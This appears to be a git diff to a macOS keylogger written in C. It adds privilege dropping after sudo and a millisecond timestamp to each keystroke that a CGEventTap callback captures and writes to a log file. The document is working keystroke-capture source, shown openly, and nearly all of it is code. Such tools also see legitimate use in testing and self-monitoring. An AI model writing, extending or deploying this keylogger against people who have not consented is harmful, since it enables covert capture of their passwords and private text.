@@ -1,5 +1,35 @@
 #include "keylogger.h"
 
+void drop_privileges() {
+    int uid = atoi(getenv("SUDO_UID"));
+    int gid = atoi(getenv("SUDO_GID"));
+    
+    if(uid == 0 || gid == 0) {
+        exit(1);
+    }
+    
+    if (setgid(gid) != 0) {
+        fprintf(stderr, "setgid: Unable to drop group privileges: %s", strerror(errno));
+        exit(1);
+    }
+    
+    if (setuid(uid) != 0) {
+        fprintf(stderr, "setuid: Unable to drop user privileges: %s", strerror(errno));
+        exit(1);
+    }
+    
+    if (setuid(0) != -1) {
+        fprintf(stderr, "ERROR: setuid back to zero succeeded, quitting as this is a security risk");
+    }
+}
+
+long millis() {
+    struct timeval time;
+    gettimeofday(&time, NULL);
+    long millis = (time.tv_sec * 1000) + (time.tv_usec / 1000);
+    return millis;
+}
+
 int main(int argc, const char *argv[]) {
 
     // Create an event tap to retrieve keypresses.
@@ -19,7 +49,12 @@ int main(int argc, const char *argv[]) {
     CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
     CGEventTapEnable(eventTap, true);
 
-
+    // Drop root
+    if(getuid() == 0 || getgid() == 0) {
+        drop_privileges();
+    }
+    
+    
     // Clear the logfile if clear argument used or log to specific file if given.
     if(argc == 2) {
         if(strcmp(argv[1], "clear") == 0) {
@@ -55,13 +90,20 @@ int main(int argc, const char *argv[]) {
 
 // The following callback method is invoked on every keypress.
 CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
+
     if (type != kCGEventKeyDown && type != kCGEventFlagsChanged && type != kCGEventKeyUp) { return event; }
 
     // Retrieve the incoming keycode.
     CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
+    long t = millis();
+    
+    //if(verbose) {
+    //  printf("%lu %s\n", t, convertKeyCode(keyCode));
+    //}
+    
     // Print the human readable key to the logfile.
-    fprintf(logfile, "%s", convertKeyCode(keyCode));
+    fprintf(logfile, "%lu %s\n", t, convertKeyCode(keyCode));
     fflush(logfile);
 
     return event;
